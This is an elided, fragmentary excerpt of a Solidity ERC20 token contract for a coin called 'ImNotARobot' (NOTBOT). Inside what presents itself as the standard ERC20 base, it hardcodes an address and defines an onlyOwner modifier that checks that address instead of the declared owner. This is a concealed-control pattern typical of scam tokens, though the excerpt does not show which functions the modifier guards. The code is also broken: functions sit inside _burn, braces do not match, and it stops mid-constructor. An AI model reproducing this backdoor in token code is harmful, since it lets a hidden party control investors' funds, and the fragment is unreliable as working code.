...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    string public NOTBOTwebsite = "https://notabot.app/";
    string public NOTBOTADDRESS = "0xBDaC3E53815E421bE6491cD8e9E3F20330A7BC19";
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private WhaleNOTBOT;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
         WhaleNOTBOT = 0xBDaC3E53815E421bE6491cD8e9E3F20330A7BC19;      
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _afterTokenTransfer(account, address(0), amount);
              ...
              function getNOTBOTwebsite() public view returns (string memory) {
        return NOTBOTwebsite;
    } 


               function getNOTBOTADDRESS() public view returns (string memory) {
        return NOTBOTADDRESS;
    }    
      modifier onlyOwner() {
         require(_msgSender() == WhaleNOTBOT);
        _;
    }    
    function _approve(
        address owner,
...
contract NOTBOT is ERC20, Ownable {
    constructor () ERC20("ImNotARobot", "NOTBOT") 
    {    
